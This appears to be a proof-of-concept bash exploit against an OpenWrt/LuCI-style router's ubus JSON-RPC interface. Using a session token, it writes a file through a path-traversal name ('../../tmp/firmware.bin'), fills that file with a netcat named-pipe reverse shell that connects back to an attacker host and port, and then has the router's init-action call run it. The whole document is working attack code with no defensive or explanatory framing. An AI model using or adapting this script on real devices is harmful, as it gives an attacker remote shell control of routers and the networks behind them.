#!/bin/bash
RHOST=192.168.56.2
RPORT=443
LHOST=192.168.56.1
LPORT=4444
SSCRIPT=../../tmp/firmware.bin
SYSAUTH=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

echo "Uploading shell script..."
curl -k 'https://'$RHOST':'$RPORT'/ubus' -X POST --data-raw '[{"jsonrpc":"2.0","id":3,"method":"call","params":["'$SYSAUTH'","file","write",{"path":"'$SSCRIPT'","data":"#!/bin/sh\nrm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc '$LHOST' '$LPORT' >/tmp/f\n","mode":448}]}]' > /dev/null 2>&1
echo "Running shell script..."
curl -k 'https://'$RHOST':'$RPORT'/ubus' -X POST --data-raw '[{"jsonrpc":"2.0","id":7,"method":"call","params":["'$SYSAUTH'","luci","setInitAction",{"name":"'$SSCRIPT'","action":"start"}]}]' > /dev/null 2>&1
